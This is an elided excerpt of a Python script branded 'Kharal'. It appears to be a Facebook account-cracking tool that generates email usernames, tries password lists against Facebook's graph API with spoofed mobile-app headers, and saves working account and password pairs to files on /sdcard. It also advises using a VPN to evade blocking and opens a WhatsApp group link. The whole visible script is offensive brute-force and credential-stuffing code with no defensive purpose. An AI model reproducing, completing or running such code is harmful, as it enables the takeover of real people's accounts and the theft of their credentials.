...
tred = speed	
#.........Join.........#
os.system (" xdg-open https://chat.whatsapp.com/FczcgaYoUQG8LrYRVdJFnE")
logo= f'''
{R}db   dD db   db  .d8b.  d8888b.  .d8b.  db      
{R}88 ,8P' 88   88 d8' `8b 88  `8D d8' `8b 88      
{R}88,8P   88ooo88 88ooo88 88oobY' 88ooo88 88
{R}88`8b   88~~~88 88~~~88 88`8b   88~~~88 88
{R}88 `88. 88   88 88   88 88 `88. 88   88 88booo. 
                                                                                            
\033[1;93m==================================================
\033[1;97m Owner :[ARSLAN-KHARAL]
\033[1;97m Facebook :[INVISIBLE]
\033[1;97m Github :[KHARAL-MODS]
\033[1;97m YOUTUBE:[KHARAL-MODS]
\033[1;97m Status :[PERSONAL]
\033[1;97m Version:\033[1;92m 0.9 \033[1;97m
\033[1;97m Notice :[Use 1.1.1.1 Vpn For OK IDz]
\033[1;93m==================================================
'''
####@-----Menu-----@####
def Kharal_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/Kharal-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' Kharal-code=Kharal-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Kharal-182^)Code=Kharal-2233]'))

####@-----Gmail-----@####
def gmail():     
        os.system('rm -rf .Kharal')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.Kharal','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Kharal','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Kharal', 'r').read().splitlines()
...
def method():
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mKharal-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mKharal-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Kharal-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mKharal-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Kharal-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mKharal-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
...
def andom():
    ...
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/Kharal-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
      ...
      try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mKharal-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Kharal.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
